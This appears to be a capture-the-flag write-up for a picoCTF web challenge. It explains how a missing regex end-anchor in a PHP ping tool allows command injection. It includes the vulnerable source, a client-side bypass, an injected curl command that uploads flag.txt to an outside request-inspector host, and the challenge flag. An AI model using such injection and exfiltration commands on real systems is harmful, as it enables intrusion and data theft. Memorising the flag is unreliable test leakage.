# Fancy-alive-monitoring - Web

We are presented with a page where we can input an input IP address of a target host. We also get the following source code:
```html
<html>
<head>
	<title>Monitoring Tool</title>
	<script>
	function check(){
		ip = document.getElementById("ip").value;
		chk = ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/);
		if (!chk) {
			alert("Wrong IP format.");
			return false;
		} else {
			document.getElementById("monitor").submit();
		}
	}
	</script>
</head>
<body>
	<h1>Monitoring Tool ver 0.1</h1>
	<form id="monitor" action="index.php" method="post" onsubmit="return false;">
	<p> Input IP address of the target host
	<input id="ip" name="ip" type="text">
	</p>
	<input type="button" value="Go!" onclick="check()">
	</form>
	<hr>

<?php
$ip = $_POST["ip"];
if ($ip) {
	// super fancy regex check!
	if (preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)) {
		exec('ping -c 1 '.$ip, $cmd_result);
		foreach($cmd_result as $str){
			if (strpos($str, '100% packet loss') !== false){
				printf("<h3>Target is NOT alive.</h3>");
				break;
			} else if (strpos($str, ', 0% packet loss') !== false){
				printf("<h3>Target is alive.</h3>");
				break;
			}
		}
	} else {
		echo "Wrong IP Format.";
	}
}
?>
<hr>
<a href="index.txt">index.php source code</a>
</body>
</html>
```

So we have one regex on the client-side and one on the server-side. By trying to figure out the differences between the regexes, we notice that the regex on client-side has $ in the end. This means that it should end with the same IP as it started with. The regex on the server-side does not check this so this means that as long as we can bypass the client side, our input only needs to start with an IP to bypass the regex on the server-side. This opens up for command injection. But first we need to bypass client-side and we can always do that by changing the code in the Javascript console. In the console, I put this function
```javascript
function check() {
    document.getElementById("monitor").submit();
}
```

That will submit the form which is enough to bypass it. Then once we have submitted it to the javascript console, we can run: 
> 192.168.1.109 ; curl -F 'data=@./flag.txt' https://requestinspector.com/inspect/01crk4yxhq4nxg1z12fajan5cq

Then I get a connect back with the flag: picoCTF{n3v3r_trust_a_b0x_d7ad162d}